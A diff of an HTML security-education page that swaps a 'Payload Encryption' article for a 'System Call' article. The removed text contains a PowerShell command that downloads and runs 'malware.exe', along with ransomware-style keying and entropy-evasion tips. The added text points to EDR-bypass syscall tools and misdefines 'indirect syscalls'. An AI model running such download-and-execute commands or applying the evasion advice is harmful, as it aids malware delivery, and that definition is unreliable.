@@ -3,632 +3,566 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Iron Hulk – Payload Encryption</title>
+  <title>Iron Hulk – System Call</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-[#0f172a] text-white font-sans min-h-screen">
   <!-- Header -->
   <header class="bg-[#1e293b] p-4 shadow flex items-center justify-between gap-4">
     <div>
-      <h1 class="text-xl font-bold text-blue-400">Payload Encryption</h1>
+      <h1 class="text-xl font-bold text-blue-400">System Call</h1>
       <small id="reading-time" class="text-xs text-gray-400"></small>
     </div>
-    <a href="../index.html" class="text-gray-300  hover:underline">← Back to Dashboard</a>
+    <a href="../index.html" class="text-gray-200  hover:underline">← Back to Dashboard</a>
   </header>
-<main id="article" class="p-6 space-y-2">
-  <section class="relative rounded-xl shadow-2xl bg-gray-900 p-10 overflow-hidden">
-    <div class="absolute -bottom-20 -right-20 w-96 h-96 bg-gradient-to-br from-green-400 to-blue-600 opacity-30 blur-3xl animate-blob animation-delay-2000"></div>
-      <div class="relative grid grid-cols-1 lg:grid-cols-2 gap-8 items-center">
-        <section class="relative bg-gradient-to-br bg-gray-800 to-gray-800 rounded-2xl shadow-2xl overflow-visible p-6">
-          <div class="absolute inset-x-0 top-0 h-1 bg-gradient-to-r from-green-400 via-blue-400 to-purple-400 animate-gradient-x"></div>
-          <code class="bg-gray-800 text-green-300 rounded px-1">PS C:\Users\Administrator> .\Encrypt.exe -c "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri "https://ironhulk.com/malware.exe" -OutFile "$env:TEMP\\Payload.exe\\"; Start-Process -FilePath "$env:TEMP\\Payload.exe\\" -NoNewWindow"</code>
-          <br><br>
-          <code class="bg-gray-800 text-green-300 rounded px-1">Encrypted payload: {0xBA, 0xDF, 0x00, 0x0D, 0x0E, 0xE8, 0xF9, 0xA5, 0xDE, 0x46, 0x48, 0x31, 0xAD, 0xBE, 0xEF, 0xCA}</code>
-          <br><br>
-          <code class="bg-gray-800 text-green-300 rounded px-1">PS C:\Users\Administrator> </code>
-        </section>
-        <div class="relative bg-gray-900 p-8 rounded-2xl shadow-2xl overflow-hidden">
-          <div class="absolute -top-10 -left-10 w-48 h-48 bg-gradient-to-tr from-purple-600 to-pink-500 opacity-20 blur-3xl animate-blob"></div>
-          <div class="absolute -bottom-10 -right-10 w-48 h-48 bg-gradient-to-br from-indigo-400 to-blue-600 opacity-20 blur-3xl animate-blob animation-delay-2000"></div>
-          <div class="relative z-10 text-gray-100 space-y-6">
-            <h2 class="text-3xl font-extrabold text-white flex items-center">
-            <span class="w-1 h-8 bg-indigo-400 mr-4 rounded"></span>
-            What Exactly Is “Payload Encryption”?</span>
-            </h2>
-            <p class="text-base leading-relaxed sm:text-justify">
-              In the context of offensive tooling, payload encryption is the practice of transforming an executable, shellcode, configuration block, or 
-              command stream into unreadable ciphertext and restoring it only at, or just before, execution. Unlike classic just-enough obfuscation (e.g., XOR’ing a few bytes), 
-              genuine payload encryption enforces cryptographic secrecy: no plaintext appears on disk and, if done properly, only fleetingly in memory. The key material can be 
-              hard-coded, derived on the fly, retrieved from a C2 channel, or calculated from attributes of the victim environment.
-            </p>
-          </div>
-        </div>
-      </div>
-      <br>
-      <section class="relative rounded-xl bg-gray-800 p-8 overflow-hidden shadow-lg">
-        <div class="absolute -top-16 -right-16 w-64 h-64 bg-gradient-to-tr from-yellow-500 to-red-500 opacity-15 blur-2xl animate-blob"></div>
-        <h2 class="text-3xl font-bold text-white">Why Do Adversaries <span class="text-yellow-400">Bother?</span></h2>
-        <ul class="mt-4 grid grid-cols-1 md:grid-cols-3 gap-6 text-gray-200 ">
-          <li class="flex items-start space-x-3 ">
-            <div class="w-4 h-8 bg-green-400 rounded-full flex items-center sm:text-justify text-gray-900 "></div>
-            <p><strong>Stealth:</strong> Static scanners cannot match signatures they cannot see.</p>
-          </li>
-          <li class="flex items-start space-x-3">
-            <div class="w-4 h-8 bg-blue-400 rounded-full flex items-center sm:text-justify text-gray-900"></div>
-            <p><strong>Flexibility:</strong> A single loader can unpack multiple mission-specific modules at runtime.</p>
-          </li>
-          <li class="flex items-start space-x-3">
-            <div class="w-4 h-8 bg-red-400 rounded-full flex items-center sm:text-justify text-gray-900"></div>
-            <p><strong>Control:</strong> By withholding keys or wrapping them in environmental conditions, operators decide where and when the code detonates, frustrating incident response and sandboxing efforts.</p>
-          </li>
-          <li class="col-span-full italic text-gray-400">MITRE’s Environmental Keying technique formalises this tactic in ATT&CK T1480.001.</li>
-        </ul>
-      </section>
-      <br>
-      <div class="relative bg-gradient-to-br from-gray-800 to-gray-900 p-8 rounded-2xl shadow-2xl overflow-hidden">
-        <div class="absolute -top-16 -left-16 w-64 h-64 bg-gradient-to-tr from-purple-500 to-pink-500 opacity-20 blur-3xl animate-blob"></div>
-        <h2 class="text-3xl font-extrabold text-center text-white mb-8">Pros &amp; Cons <span class="text-pink-400">For Operators</span></h2>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 relative z-10">
-          <div class="bg-gray-800 bg-opacity-60 p-6 rounded-xl transform hover:scale-105 transition-transform duration-300">
-            <div class="flex items-center mb-4">
-              <span class="w-8 h-8 bg-green-400 rounded-full flex items-center sm:text-justify text-white font-bold">✓</span>
-              <h3 class="ml-3 text-xl font-semibold text-green-300">Pros</h3>
-            </div>
-            <ul class=" text-gray-100 pl-4 list-disc">
-              <li>Bypasses string- and opcode-based detection; hampers reverse engineering</li>
-              <li>Reuses commodity implants under fresh cryptographic wrappers</li>
-              <li>Enables target gating (decrypt only on approved hosts)</li>
-            </ul>
-          </div>
-          <div class="bg-gray-800 bg-opacity-60 p-6 rounded-xl transform hover:scale-105 transition-transform duration-300 animation-delay-500">
-            <div class="flex items-center mb-4">
-              <span class="w-8 h-8 bg-red-400 rounded-full flex items-center sm:text-justify text-white font-bold">✕</span>
-              <h3 class="ml-3 text-xl font-semibold text-red-300">Cons</h3>
-            </div>
-            <ul class="text-gray-100 pl-4 list-disc">
-              <li>Increases complexity; key-exchange failures break builds</li>
-              <li>Adds binary size and runtime overhead</li>
-              <li>Weak crypto choices expose campaigns to easy tools</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <br>
-      <div class="w-full bg-gray-800 bg-opacity-50 rounded-lg p-6 animate-fadeInUp animation-delay-500">
-        <h2 class="text-2xl font-bold text-red-400 mb-1 flex items-center mb-4">
-          <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3"></path></svg>
-          Detection and Defensive Considerations</span>
-        </h2>
-        <p class="text-gray-300 leading-relaxed sm:text-justify pl-1 ">
-          Static <span class="text-blue-300 font-mono ">YARA</span> signatures can still flag decryptor stubs like API import patterns for <code class="bg-gray-800 text-green-300 rounded px-1">CryptEncrypt</code>, <code class="bg-gray-800 text-green-300 rounded px-1">VirtualProtect</code>, or self-modifying loops. Memory scanners hunt 
-          for freshly committed <code class="bg-gray-800 text-green-300 rounded px-1">RWX</code> pages whose entropy suddenly drops after write-and-execute pivots. Behavioural analytics look for the hallmark sequence: 
-          <code class="bg-gray-800 text-green-300 rounded px-1">allocate → write high-entropy buffer → change protection → create thread</code>. Yet, environmental keying and just-in-time key delivery force defenders to instrument the process context network, registry, VM introspection rather than rely solely on byte patterns.                     </p>
-      </div>
-      <br>
-      <div class="w-full bg-gray-800 bg-opacity-50 rounded-lg p-6 animate-fadeInUp animation-delay-500">
-        <h2 class="text-2xl font-bold text-blue-400 mb-1 flex items-center mb-4">
-          <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3"></path></svg>
-          Defending Against Security-Side Brute-Force:</span>
-        </h2>
-        <p class="text-gray-300 leading-relaxed sm:text-justify pl-1">
-          When a threat-actor ships an encrypted payload, the real battle is no longer whether defenders will capture the ciphertext, sooner or later they will, but whether
-          anyone can crack it before the campaign is finished. Seasoned operators therefore harden the key itself, add layers of misdirection, and make brute-forcing financially or computationally irrational.
-          <br><br>
-          <div class="flex items-start space-x-4">
-            <div class="w-4 h-12 bg-indigo-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
-            <div>
-              <p class="text-gray-300 sm:text-justify"><strong>Use a keyspace that defenders cannot afford to search:</strong> Contemporary ransomware builders default to 256-bit AES or XChaCha20 session keys wrapped in RSA-2048 or Curve25519. One successful brute-force would cost weeks of GPU time and still expose only a single victim because each implant is keyed per-host. LockBit 3.0 is explicit about that design choice: the stub generates a fresh AES-CTR key on every endpoint and discards it once encryption finishes.</p>
-            </div>
-          </div>
+  <!-- Article -->
+<main id="article" class="p-2 sm:text-justify ">
+    <section class="relative mx-auto overflow-hidden rounded-3xl bg-gradient-to-br from-slate-800/90 via-slate-900 to-black p-10 ring-1 ring-cyan-500/20">
+        <div class="absolute -left-16 w-48 h-48 bg-indigo-500 rounded-full opacity-20 mix-blend-screen filter blur-3xl"></div>
+        <div class="bg-gray-800 bg-opacity-60 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
+        <h2 class="text-4xl font-bold text-indigo-300 mb-4">What Is a System Call?</h2>
+        <p class="text-gray-200">
+            A system call is the mechanism by which a user-mode application requests a service from the operating system’s kernel. Whenever you open a file, allocate memory, 
+            create or terminate a process, or perform any I/O operation, your application invokes a system call. At a high level, the process goes like this: the application 
+            executes a special instruction  that triggers a controlled switch from user mode to kernel mode. The kernel then validates the request, performs the requested operation 
+            on behalf of the application, and returns control (and any results) back to user space. System calls constitute a protected boundary: without them, user-mode code 
+            couldn’t directly manipulate hardware or critical OS data structures, preserving system stability and security.
         </p>
-      </div>
-      <br>
-      <section class="relative rounded-xl bg-gray-800 p-8 overflow-visible shadow-lg">
-        <div class="absolute -bottom-16 -right-16 w-72 h-72 bg-gradient-to-br from-blue-400 to-green-400 opacity-20 blur-2xl animate-blob animation-delay-2000"></div>
-        <h2 class="text-2xl font-bold text-white-400 mb-6">Symmetric vs. Asymmetric<br><span class="text-indigo-400 text-lg">What Operators Really Prefer?</span></h2>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-          <div class="flex items-start space-x-4">
-            <div class="w-5 h-10 bg-indigo-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
-            <div>
-              <h3 class="font-semibold text-white">Bulk encryption demands speed &amp; stealth:</h3>
-              <p class="text-gray-300 sm:text-justify">Encrypting gigabytes of victim data (or even a 500 KB reflective DLL) must finish before EDR’s behavioural models flag the process. AES-NI or ChaCha20 running in user space gives gigabytes-per-second throughput with only a few hundred bytes of decryption stub.</p>
-            </div>
-          </div>
-          <div class="flex items-start space-x-4">
-            <div class="w-5 h-10 bg-blue-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
-            <div>
-              <h3 class="font-semibold text-white">Key protection demands one-way secrecy:</h3>
-              <p class="text-gray-300 sm:text-justify">If the same raw AES key were hard-coded in every build, any incident-responder could reverse one sample and unlock them all. Wrapping that key inside an RSA/ECC envelope means the blue team would have to crack 2048-bit RSA (computationally infeasible) or reach the attacker’s C2 to obtain the private key.</p>
-            </div>
-          </div>
-          <div class="flex items-start space-x-4">
-            <div class="w-5 h-10 bg-green-500 rounded-full flex items-center sm:text-justify text-white font-bold"></div>
-            <div>
-              <h3 class="font-semibold text-white">Hybrid approach</h3>
-              <p class="text-gray-300 sm:text-justify"><code class="bg-gray-800 text-green-300 rounded px-1">Generate random symmetric key → encrypt payload/data → encrypt that key with attacker’s public RSA/ECC key</code>. This is the workflow documented in LockBit 3.0, BlackCat, Hive, Conti, and “fake” LockBit variants discovered by <a href="https://www.trendmicro.com/en_us/research/24/j/fake-lockbit-real-damage-ransomware-samples-abuse-aws-s3-to-stea.html" class="underline">Trend Micro</a> that switched to AES-CTR + MD5-derived per-file keys.</p>
-            </div>
-          </div>
+        <br>
+        <blockquote class="border-l-4 border-blue-400 pl-4 italic">
+            Why care? Syscalls are the only legal way to touch hardware/memory. Malware abuses them. Security tools spy on them.
+        </blockquote>
         </div>
         <br>
-        <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-green-400 to-blue-500 opacity-20 blur-2xl animate-blob animation-delay-2000"></div>
-        <div class="relative z-10 grid grid-cols-1 md:grid-cols-2 gap-8 text-gray-200">
-          <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300">
-            <h4 class="text-lg font-semibold text-yellow-400 ">Why Not Purely Asymmetric?</h4>
-            <ul class="list-disc p-5 list-outside text-gray-300 sm:text-justify">
-              <li><strong>Throughput:</strong> Too slow for large payloads.</li>
-              <li><strong>Size:</strong> 20 MB beyond practical loader sizes.</li>
-              <li><strong>Detectability:</strong> Big-number libraries (bcryptprimitives, mbedTLS) that raise heuristic flags and leave unmistakable API traces (BCryptEncrypt, CryptImportKey, etc.)..</li>
-            </ul>
-          </div>
-          <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300 animation-delay-500">
-            <h4 class="text-lg font-semibold text-yellow-400 ">Why Not Purely Symmetric?</h4>
-            <ul class="list-disc p-5 list-outside text-gray-300 sm:text-justify">
-              <li><strong>Key Exposure:</strong> Raw AES keys can be extracted or brute-forced once captured.</li>
-            </ul>
-          </div>
+        <div class="bg-gray-800 bg-opacity-60 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
+        <h2 class="text-4xl font-bold text-indigo-300 mb-4">What Is a Systemcall Service Number?</h2>
+        <p class="text-gray-200">
+            A system call service number (SSN) is basically an integer code that acts as a shortcut for the operating system to figure out which kernel function to run when an app makes a 
+            request. Think of it like a phone extension so when you dial a number, it routes you to the right department (in this case, a specific kernel service). This number is 
+            used in direct system calls to tell the kernel exactly what operation to perform, without passing around function names, which keeps things fast and efficient.
+        </p><br>
+        <div class="sm:grid sm:gap-8 sm:grid-cols-2 relative">
+            <div class="group bg-gradient-to-br from-gray-800 to-gray-700 p-6 rounded-3xl shadow-2xl transform hover:scale-105 transition">
+                <div class="flex items-center mb-4">
+                <div class="p-3 bg-green-500 rounded-full group-hover:bg-green-400 transition">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4" />
+                    </svg>
+                </div>
+                <h3 class="ml-4 text-2xl font-semibold text-green-300">Windows (SSDT Index)</h3>
+                </div>
+                <p class="text-gray-200 leading-relaxed">
+                    The System Service Dispatch Table (SSDT) holds pointers to every kernel routine exposed via <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">Nt/Zw</code> calls. When you invoke a syscall stub in 
+                    <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">ntdll.dll</code>, it loads its corresponding service number into the <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">EAX (x86)</code> or <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">RAX (x64)</code> register and executes the syscall 
+                    (or sysenter) instruction. The kernel uses that value as an index into the SSDT to dispatch to the correct function. For example:
+                </p>
+                    <ul class="list-none space-y-2 text-gray-200">
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-green-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtCreateFile</code> → <span class="font-semibold text-green-300"> 0x55</span>
+                        </li>
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-green-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtOpenProcess </code> → <span class="font-semibold text-green-300"> 0x23</span>
+                        </li>
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-green-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtAllocateVirtualMemory </code> → <span class="font-semibold text-green-300"> 0x18</span>
+                        </li>
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-green-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtCreateTimer </code> → <span class="font-semibold text-green-300"> 0xCB</span>
+                        </li>
+                    </ul>
+
+            </div>
+            <div class="group bg-gradient-to-br from-gray-800 to-gray-700 p-6 rounded-3xl shadow-2xl transform hover:scale-105 transition">
+                <div class="flex items-center mb-4">
+                <div class="p-3 bg-yellow-500 rounded-full group-hover:bg-yellow-400 transition">
+                    <!-- Icon -->
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+                    </svg>
+                </div>
+                <h3 class="ml-4 text-2xl font-semibold text-yellow-300">Linux (SYSCALL Table Index)</h3>
+                </div>
+                <p class="text-gray-200 leading-relaxed">
+                    System calls are defined in a syscall table, often in arch/x86/entry/syscalls/syscall_64.tbl or similar. User code places the syscall number in the 
+                    RAX register, arguments in RDI, RSI, etc., and then executes syscall. The kernel reads RAX, looks up the handler in its internal table, and jumps there. For 
+                    instance, on x86_64:
+                </p>
+                    <ul class="list-none space-y-2 text-gray-200">
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-yellow-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">read()</code> → <span class="font-semibold text-yellow-300"> 0</span>
+                        </li>
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-yellow-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">write()</code> → <span class="font-semibold text-yellow-300"> 1</span>
+                        </li>
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-yellow-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">open()</code> → <span class="font-semibold text-yellow-300"> 2</span>
+                        </li>
+                        <li class="flex items-center">
+                            <span class="inline-block w-2 h-2 bg-yellow-400 rounded-full mr-3"></span>
+                            <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">execve()</code> → <span class="font-semibold text-yellow-300"> 59</span>
+                        </li>
+                    </ul>
+            </div>
         </div>
         <br>
-        <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-green-400 to-blue-500 opacity-20 blur-2xl animate-blob animation-delay-2000"></div>
-        <div class="relative z-10 grid grid-cols-1 md:grid-cols-2 gap-8 text-gray-200">
-          <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300">
-            <h3 class="text-xl font-bold text-indigo-400 mb-3">What “Entropy Level” Really Means</h3>
-            <p class=" leading-relaxed sm:text-justify">
-                In forensic tooling the entropy level of a file (or of an individual PE section, packet, log record, etc.) is the average Shannon entropy measured in bits per 
-                byte. The scale runs from 0 (completely predictable, all-zero padding) to 8 (completely random—what you’d get from strong encryption or good PRNG output). IBM’s 
-                QRadar docs use exactly this 0–8 scale when explaining why encrypted ZIPs look suspicious. Mathematically the scanner walks the byte array, builds a 256-bucket histogram,
-                and plugs the counts into: <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">H = – Σ (pᵢ · log₂ pᵢ)</code> where pᵢ is the probability of 
-                each byte value 0-255. A perfectly uniform distribution gives 8.0 bits/byte; English text hovers around 4.3–5.0.
+        <blockquote class="border-l-4 border-blue-400 pl-4 italic">
+            Note: Service numbers vary by Windows version and build, never hard-code; always query dynamically. Try Hell's Gate, FreshyCalls or SysWhispers3.
+        </blockquote>
+        </div>   
+        <br>     
+        <div class="bg-gray-800 bg-opacity-60 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
+        <h2 class="text-4xl font-bold text-green-300 text-center">Direct/Indirect System Calls</h2><br>
+        <div class="flex flex-col md:flex-row gap-8">
+            <div class="flex-1 bg-gray-800 bg-opacity-60 p-6 rounded-3xl shadow-xl transform hover:scale-105 transition">
+                <h3 class="text-2xl font-semibold text-green-300 mb-3">Direct Syscalls</h3>
+                <p class="text-gray-200">
+                    A direct system call is when an application or malware directly invokes a kernel function without going through any intermediate layers or standard libraries. 
+                    This means the code is essentially talking straight to the operating system's kernel using low-level mechanisms. For example, on Windows, it's similar but often involves
+                    functions from the Native API, such as <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtCreateFile</code> or <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">ZwWriteFile</code>, which are part of the System Service Dispatch Table (SSDT).
+                    </p>
+                    <br>
+                <p><strong>In practice:</strong></p>
+                <p class="text-gray-200">
+                    When a direct system call is made, the CPU switches from user mode to kernel mode via a special instruction like <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">int 0x80</code> on older x86 systems or syscall on 
+                    modern AMD64. The kernel then handles the request directly based on the syscall number and parameters passed. This bypasses any user-space wrappers, giving you 
+                    raw access to kernel services.
+                </p>
+                <br>
+                <p><strong>Advantages:</strong></p>
+                <p class="text-gray-200">
+                    Offers high performance and evasion potential by bypassing user-mode hooks in EDR tools, making it ideal for stealthy code execution in pen tests. 
+                    Direct calls reduce detection chances in initial access phases.
+                </p>
+                <br>
+                <p><strong>Disadvantages:</strong></p>
+                <p class="text-gray-200">
+                    Highly platform-specific, with syscall numbers changing across OS updates, leading to crashes if not handled dynamically. Also, kernel-level monitoring can flag 
+                    them as suspicious, increasing detection risk.
+                </p>
+            </div>
+            <div class="flex-1 bg-gray-800 bg-opacity-60 p-6 rounded-3xl shadow-xl transform hover:scale-105 transition">
+                <h3 class="text-2xl font-semibold text-yellow-300 mb-3">Indirect Syscalls</h3>
+                <p class="text-gray-200">
+                    An indirect system call, on the other hand, involves invoking a kernel service through higher-level abstractions, like standard libraries or APIs, rather than 
+                    directly addressing the kernel. Here, the application uses functions from user-space libraries like <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">fopen</code> from libc on Linux or <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">CreateFileW</code> from the Windows API
+                    to make the call. These libraries act as intermediaries, translating your request into the actual kernel syscall behind the scenes.
+                </p>
+                <br>
+                <p><strong>In practice:</strong></p>
+                <p class="text-gray-200">
+                    When you call an indirect system call, the library handles the details such as mapping the function to the correct syscall number, managing parameters, and dealing 
+                    with any OS-specific quirks before the request is passed to the kernel. For example, calling <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">fopen</code> in C doesn't directly use the syscall instruction; instead, it 
+                    goes through libc, which then invokes the appropriate kernel function like <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">sys_open</code> on Linux. This adds a layer of indirection, making the code more readable and 
+                    portable but also introducing potential overhead.
+                </p>
+                <br>
+                <p><strong>Advantages:</strong></p>
+                <p class="text-gray-200">
+                    Easier to implement and more portable, allowing code to run across different OSes without major changes. Can blend with legitimate traffic for better stealth in 
+                    less-monitored environments.
+                </p>
+                <br>
+                <p><strong>Disadvantages:</strong></p>
+                <p class="text-gray-200">
+                    Adds performance overhead and is vulnerable to API hooking, making it less reliable for evasion in advanced EDR setups.
+                </p>
+            </div>
+        </div>
+        </div>
+        <br>
+        <div class="flex-1 bg-gray-800 bg-opacity-60 p-6 rounded-3xl shadow-xl transform ">
+        <div class="mx-auto px-6">
+        <h2 class="text-center mb-12 text-5xl font-extrabold text-gradient-to-r from-red-500 to-pink-500">Why Direct Syscalls Are Watched Most By AV/EDR</h2>
+        <div class="grid gap-8 md:grid-cols-2 lg:grid-cols-2">
+            <div class="group bg-gray-900 hover:bg-red-900 transition p-6 rounded-2xl shadow-xl ">
+            <div class="flex items-center mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-red-400 group-hover:text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M12 1l8 4v6c0 5.523-3.582 10.74-8 12-4.418-1.26-8-6.477-8-12V5l8-4z" />
+                </svg>
+                <h3 class="ml-3 text-2xl font-semibold">Behavioral and Anomaly Detection</h3>
+            </div>
+            <p class="text-gray-300 leading-relaxed">
+                EDR tools use syscall monitoring to build behavioral baselines. For instance, tools like CrowdStrike or Microsoft Defender analyze syscall sequences to spot 
+                deviations from normal patterns. If a process suddenly makes unusual syscalls such as rapid file reads/writes, it could flag ransomware or exploit attempts. 
+                This is more effective than monitoring less critical areas like user-mode APIs alone.
             </p>
-          </div>
-          <div class="bg-gray-700 bg-opacity-60 p-6 rounded-lg transform hover:-translate-y-1 transition-transform duration-300 animation-delay-500">
-            <h3 class="text-xl font-bold text-yellow-400 mb-3">Why Authors Tune Entropy</h3>
-            <p class=" leading-relaxed sm:text-justify">
-                Defenders long ago realised that “almost-8-bit entropy” flags encryption, packing or steganography. Static engines therefore raise risk scores on sections (or outbound file writes) 
-                whose entropy spikes past a threshold, commonly 7.2–7.5 bits/byte. Attackers respond in two ways:
+            </div>
+            <div class="group bg-gray-900 hover:bg-green-800 transition p-6 rounded-2xl shadow-xl">
+            <div class="flex items-center mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-green-400 group-hover:text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M6 9l6 6m0 0l6-6m-6 6V3" />
+                </svg>
+                <h3 class="ml-3 text-2xl font-semibold">Universal Gateway to the Kernel</h3>
+            </div>
+            <p class="text-gray-300 leading-relaxed">
+                Every sensitive operation such as file I/O, memory allocation, process/thread control, DLL loading, ultimately happens via a syscall. By monitoring these low-level entry points, AV/EDR solutions 
+                gain visibility over all critical system activity, regardless of which library or shim the attacker uses.
             </p>
-            <ul class="list-disc list-inside sm:text-justify">
-              <li><strong>Camouflage:</strong> Compress-then-encrypt to drop entropy below ~7.5.</li>
-              <li><strong>Padding:</strong> Mix in zero pages or ASCII strings to lower the average.</li>
-              <li><strong>Fakes:</strong> Insert dummy import tables/config blocks to mislead scanners.</li>
-            </ul>
-          </div>
-        </div>
-      </section>
-      <br>
-      <section class="relative rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 p-8 overflow-visible shadow-2xl">
-        <div class="absolute -top-16 -left-16 w-64 h-64 bg-gradient-to-tr from-pink-500 to-purple-600 opacity-20 blur-3xl animate-blob animation-delay-500"></div>
-        <div class="relative z-10 text-gray-200">
-          <h2 class="text-3xl font-extrabold text-white">How security tools <span class="text-blue-400">evaluate entropy</span></h2>
-          <ol class="list-decimal list-inside pl-5">
-            <li><span class="font-semibold">Slice:</span> Each file into chunks, whole file, per-section (PE headers, .text, .rsrc), or rolling windows of N kB..</li>
-            <li><span class="font-semibold">Compute:</span> Measure Shannon entropy for each slice.</li>
-            <li><span class="font-semibold">Compare:</span> Flag slices >7.5 bits/byte (excluding <code class="bg-gray-800 text-green-300 rounded px-1">.text</code>) or feed values into ML models.</li>
-          </ol>
-          <br>
-          <div class="bg-gray-700 bg-opacity-50 p-6 rounded-xl transform hover:scale-105 transition-transform duration-300">
-            <p class="leading-relaxed text-gray-300">
-              Behavioral monitors hook write APIs like 
-              <code class="bg-gray-800 text-green-300 rounded px-1">NtWriteFile</code> and 
-              <code class="bg-gray-800 text-green-300 rounded px-1">WriteFileEx</code> to catch high-entropy writes in real time. 
-              If a process starts saving >7.6-bit data to many files, writes are blocked—mimicking modern anti-ransomware libraries.
+            </div>
+            <div class="group bg-gray-900 hover:bg-blue-800 transition p-6 rounded-2xl shadow-xl">
+            <div class="flex items-center mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-400 group-hover:text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M3 7v10a1 1 0 001 1h2m10 0h2a1 1 0 001-1V7m-6-4v4m0 0H9m3 0h3" />
+                </svg>
+                <h3 class="ml-3 text-2xl font-semibold">Evasion and Stealth Challenges</h3>
+            </div>
+            <p class="text-gray-300 leading-relaxed">
+                Malware often tries to evade detection by manipulating syscalls like, using direct syscalls to bypass API hooks. As a result, AV/EDR has evolved to focus heavily 
+                on syscall-level interception through kernel hooks, ETW (Event Tracing for Windows), or eBPF (on Linux) to cover both direct and indirect calls. This makes syscalls 
+                a "must-watch" area, as they're harder for attackers to obfuscate completely.
             </p>
-          </div>
-        </div>
-      </section>
-      <br>
-      <section class="relative rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 p-8 overflow-visible shadow-2xl">
-        <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-green-400 to-blue-600 opacity-20 blur-3xl animate-blob animation-delay-2000"></div>
-        <h2 class="text-3xl font-extrabold text-white text-center mb-8">Typical Entropy Ranges in <span class="text-indigo-400">Clean Files</span></h2>
-        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
-          <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
-            <div class="absolute -top-6 -right-6 w-32 h-32 bg-indigo-500 opacity-20 blur-2xl"></div>
-            <h3 class="text-lg font-semibold text-white mb-2">Plain Text/Scripts</h3>
